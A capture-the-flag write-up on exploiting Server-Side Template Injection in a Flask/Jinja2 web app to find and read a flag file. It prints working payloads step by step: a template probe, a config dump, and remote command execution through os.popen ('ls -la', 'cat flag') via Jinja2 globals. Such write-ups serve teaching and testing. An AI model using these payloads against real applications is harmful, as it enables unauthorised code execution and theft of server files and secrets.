# Server-Side Template Injection (SSTI) CTF Challenge Writeup

## **Challenge Overview**
We were given a website with an input field that allowed users to enter an announcement. The challenge involved exploiting **Server-Side Template Injection (SSTI)** to extract the flag stored on the server.

---

## **Step 1: Identifying the Vulnerability**
To test for SSTI, we entered a simple mathematical expression inside template delimiters:

```
{{7*7}}
```

Upon submission, the output returned:

```
49
```

This confirmed that user input was being evaluated inside a **Jinja2 template engine (Python Flask)**, making the application vulnerable to **SSTI**.

---

## **Step 2: Extracting Configuration Information**
Since we had SSTI access, we attempted to retrieve application configuration details by injecting:

```
{{ config.items() }}
```

This revealed various Flask configuration settings, such as:

```
dict_items([
  ('DEBUG', False), ('TESTING', False), ('SECRET_KEY', None),
  ('SESSION_COOKIE_NAME', 'session'), ('PREFERRED_URL_SCHEME', 'http'),
  ('MAX_COOKIE_SIZE', 4093)
])
```

While the **SECRET_KEY** was `None`, this confirmed that we had **access to Flask's internal objects**, which we could leverage for deeper exploitation.

---

## **Step 3: Gaining File System Access**
To enumerate files in the current directory, we executed:

```
{{ config.__class__.__init__.__globals__['os'].popen('ls -la').read() }}
```

The output revealed the following files:

```
total 12
drwxr-xr-x 1 root root 25 Mar 20 09:56 .
drwxr-xr-x 1 root root 23 Mar 20 09:56 ..
drwxr-xr-x 2 root root 32 Mar 20 09:56 __pycache__
-rwxr-xr-x 1 root root 1241 Mar 6 03:27 app.py
-rw-r--r-- 1 root root 58 Mar 6 19:43 flag
-rwxr-xr-x 1 root root 268 Mar 6 03:27 requirements.txt
```

The presence of a file named **flag** indicated our target file.

---

## **Step 4: Reading the Flag File**
To read the contents of `flag`, we used:

```
{{ config.__class__.__init__.__globals__['open']('flag').read() }}
```

Alternatively, if the above method didn't work, we could use:

```
{{ config.__class__.__init__.__globals__['os'].popen('cat flag').read() }}
```

This successfully displayed the flag.

---

## **Final Notes and Key Takeaways**
1. **SSTI Detection:** If user input is rendered directly in a template, injecting `{{7*7}}` can confirm an SSTI vulnerability.
2. **Exploiting SSTI in Jinja2:** Since Flask's Jinja2 exposes `config`, we can retrieve application details using `{{ config.items() }}`.
3. **Command Execution via SSTI:** Leveraging `os.popen()` allows interaction with the underlying system.
4. **Flag Extraction:** Using `popen('ls -la')` helped locate the flag, and `popen('cat flag')` revealed its contents.

This methodology can be applied to other SSTI challenges in **Flask, Django, and other template engines** like **Twig (PHP)** or **Freemarker (Java)**.

---

## **Future Approach for Similar Challenges**
1. **Test for SSTI with `{{7*7}}`**
2. **Check for Internal Objects (`config.items()`)**
3. **Attempt File Listing (`ls -la`)**
4. **Read Flag File (`cat flag`)**

For every CTF challenge, we will document steps in a similar way to ensure clarity and repeatability. ðŸš€

